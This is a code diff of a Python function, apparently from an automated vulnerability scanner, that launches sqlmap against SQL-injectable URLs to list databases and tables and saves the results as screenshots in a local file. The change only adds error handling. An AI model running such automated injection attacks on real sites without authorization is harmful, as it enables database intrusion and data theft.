@@ -147,53 +147,58 @@ def sqlmap_attack(vul_info,num):
     cmd = "python "+sqlmap_path+" -u " +'"'+vul_url+'"' + "-v 0 --random-agent --technique=BEUSQ --batch -o --dbs"
     cmd2 = "python "+sqlmap_path+" -u " +'"'+vul_url+'"' + "-v 0 --random-agent --technique=BEUSQ --batch -o --tables"
     print(cmd)
-    process = subprocess.Popen(cmd,stdout=subprocess.PIPE)
-    print(">"*10)
-    out, err = process.communicate()
-    status = process.wait()
-    print("cmd out: ", out.decode())
-    print("<"*10)
-    lines = out.decode()
+    try:
+        process = subprocess.Popen(cmd,stdout=subprocess.PIPE)
+        print(">"*10)
+        out, err = process.communicate()
+        status = process.wait()
+        print("cmd out: ", out.decode())
+        print("<"*10)
+        lines = out.decode()
+        
+        if "available databases" in lines or "Database:" in lines:
+            print("查到数据库 添加"+vul_url)
+            base64str = make_pic(str(time.time()),lines)
+            try:
+                with open("sqlinj.txt",errors="ignore",encoding='UTF-8') as f:
+                    vullist_json = json.load(f)
+                run_complete_attack_url = []
+                for vulinfo in vullist_json:
+                    vul_url_json = vulinfo["vul_url"]
+                    if vul_url == vul_url_json:
+                        temp = {"vul_id":vulinfo["vul_id"],"vul_url":vul_url,"flag":vulinfo["flag"],"base64str":base64str}
+                        run_complete_attack_url.append(temp)
+                    else:
+                        run_complete_attack_url.append(vulinfo)
+                with open("sqlinj.txt",'w',errors="ignore") as w:
+                    data2 = json.dumps(run_complete_attack_url)
+                    w.write(data2)
+                    w.flush()
+                    run_complete_attack_url = []
+            except Exception as e:
+                print('traceback.print_exc(): ', traceback.print_exc())
+        else:
+            #不爆破表了 太费时间了也
+            return
+            process2 = subprocess.Popen(cmd2,stdout=subprocess.PIPE)
+            print("("*10)
+            out2, err2 = process2.communicate()
+            status2 = process2.wait()
+            print("cmd out: ", out2.decode())
+            print(")"*10)
+            lines2 = out2.decode()
+            
+            if "No tables found" in lines2:
+                print("表也没查到 无法利用的sql注入"+vul_url)
+            elif "Database:" in lines2:
+                print("爆到表了 添加"+vul_url)
+                make_pic(str(time.time()),lines2)
+    except Exception as e:
+        print('traceback.print_exc(): ', traceback.print_exc())
 
     print("[]"*10)
 
-    if "available databases" in lines or "Database:" in lines:
-        print("查到数据库 添加"+vul_url)
-        base64str = make_pic(str(time.time()),lines)
-        try:
-            with open("sqlinj.txt",errors="ignore",encoding='UTF-8') as f:
-                vullist_json = json.load(f)
-            run_complete_attack_url = []
-            for vulinfo in vullist_json:
-                vul_url_json = vulinfo["vul_url"]
-                if vul_url == vul_url_json:
-                    temp = {"vul_id":vulinfo["vul_id"],"vul_url":vul_url,"flag":vulinfo["flag"],"base64str":base64str}
-                    run_complete_attack_url.append(temp)
-                else:
-                    run_complete_attack_url.append(vulinfo)
-            with open("sqlinj.txt",'w',errors="ignore") as w:
-                data2 = json.dumps(run_complete_attack_url)
-                w.write(data2)
-                w.flush()
-                run_complete_attack_url = []
-        except Exception as e:
-            print('traceback.print_exc(): ', traceback.print_exc())
-    else:
-        #不爆破表了 太费时间了也
-        return
-        process2 = subprocess.Popen(cmd2,stdout=subprocess.PIPE)
-        print("("*10)
-        out2, err2 = process2.communicate()
-        status2 = process2.wait()
-        print("cmd out: ", out2.decode())
-        print(")"*10)
-        lines2 = out2.decode()
-        
-        if "No tables found" in lines2:
-            print("表也没查到 无法利用的sql注入"+vul_url)
-        elif "Database:" in lines2:
-            print("爆到表了 添加"+vul_url)
-            make_pic(str(time.time()),lines2)
+    
     
 def poolmana(web_url,uuid,scanid,target):
     vullist = []
